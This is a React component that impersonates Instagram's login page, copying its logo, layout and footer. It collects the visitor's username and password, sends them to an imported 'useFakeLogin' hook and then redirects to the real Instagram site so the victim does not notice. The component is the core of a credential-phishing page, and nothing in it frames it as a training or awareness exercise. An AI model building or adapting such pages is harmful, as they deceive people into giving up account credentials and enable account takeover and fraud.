import { useState } from "react";
import { useFakeLogin } from "../use-fake-login";
import { Facebook } from "lucide-react";
const links = [
  "Meta",
  "About",
  "Blog",
  "Jobs",
  "Help",
  "API",
  "Privacy",
  "Terms",
  "Locations",
  "Instagram Lite",
  "Threads",
  "Contact Uploading & Non-Users",
  "Meta Verified",
];

//the UI is ai generated to gain time
const Instagram = () => {
  const [items, setItems] = useState({
    login: "",
    password: "",
  });
  const login = useFakeLogin();

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    setItems({
      ...items,
      [e.target.name]: e.target.value,
    });
  };

  const handleLogin = async () => {
    await login(items);
    window.location.href = "https://www.instagram.com";
  };

  const isValid = items.login.length > 0 && items.password.length >= 6;

  return (
    <div className="min-h-screen bg-white md:bg-gray-50 flex flex-col items-center justify-center p-4">
      <main className="flex w-full justify-center max-w-[800px] gap-8">
        {/* Phone mockup (hidden on small screens) - keeping structure clean, focusing on form */}

        <div className="flex flex-col gap-2.5 w-full max-w-[350px]">
          {/* Main Login Card */}
          <div className="bg-white border text-center pt-8 pb-4 px-10 border-gray-300 flex flex-col items-center">
            <img
              src="../../../../../public/pages/instagram-logo.png"
              alt="Instagram"
            />

            <form
              className="w-full flex flex-col gap-1.5"
              onSubmit={(e) => {
                e.preventDefault();
                handleLogin();
              }}
            >
              <div className="relative group">
                <input
                  type="text"
                  name="login"
                  required
                  value={items.login}
                  onChange={handleInput}
                  className="w-full text-xs px-2 pt-2.5 pb-2.5 bg-gray-50 border border-gray-300 rounded-[3px] focus:outline-none focus:border-gray-400 placeholder:text-xs placeholder:text-gray-500"
                  placeholder="Phone number, username, or email"
                  aria-label="Phone number, username, or email"
                />
              </div>
              <div className="relative group">
                <input
                  type="password"
                  name="password"
                  required
                  value={items.password}
                  onChange={handleInput}
                  className="w-full text-xs px-2 pt-2.5 pb-2.5 bg-gray-50 border border-gray-300 rounded-[3px] focus:outline-none focus:border-gray-400 placeholder:text-xs placeholder:text-gray-500"
                  placeholder="Password"
                  aria-label="Password"
                />
              </div>

              <button
                type="submit"
                disabled={!isValid}
                className={`text-white text-sm font-semibold py-1.5 rounded-[8px] mt-2 transition-opacity ${
                  isValid ? "bg-[#0095f6]" : "bg-[#4cb5f9] cursor-default"
                }`}
              >
                Log in
              </button>

              <div className="flex items-center my-3.5 w-full">
                <div className="h-px bg-gray-300 flex-1"></div>
                <span className="px-4 text-xs font-semibold text-gray-500">
                  OR
                </span>
                <div className="h-px bg-gray-300 flex-1"></div>
              </div>

              <a
                href="https://www.instagram.com/"
                className="flex justify-center items-center gap-2 text-[#385185] font-semibold text-sm my-2"
              >
                <Facebook size={20} fill="#385185" className="border-none" />
                <span>Log in with Facebook</span>
              </a>
            </form>

            <a
              href="https://www.instagram.com/accounts/password/reset/"
              className="text-xs text-[#00376b] mt-3"
            >
              Forgot password?
            </a>
          </div>

          {/* Sign up Card */}
          <div className="bg-white border border-gray-300 py-5 text-center">
            <p className="text-sm text-gray-800">
              Don't have an account?{" "}
              <a
                href="https://www.instagram.com/accounts/emailsignup/"
                className="text-[#0095f6] font-semibold"
              >
                Sign up
              </a>
            </p>
          </div>

          {/* Get App Section */}
          <div className="text-center p-2">
            <p className="text-sm text-gray-800 my-2">Get the app.</p>
            <div className="flex justify-center gap-2">
              <img
                alt="Get it on Google Play"
                className="h-[40px]"
                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
              />
              <img
                alt="Get it from Microsoft"
                className="h-[40px]"
                src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
              />
            </div>
          </div>
        </div>
      </main>

      <footer className="mt-12 mb-6 px-4">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-gray-500 mb-4">
          {links.map((item) => (
            <a key={item} href="#" className="hover:underline">
              {item}
            </a>
          ))}
        </div>
        <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500">
          <select className="bg-transparent outline-none cursor-pointer">
            <option value="en">English</option>
            <option value="fr">Français</option>
            <option value="es">Español</option>
          </select>
          <span>© 2024 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default Instagram;
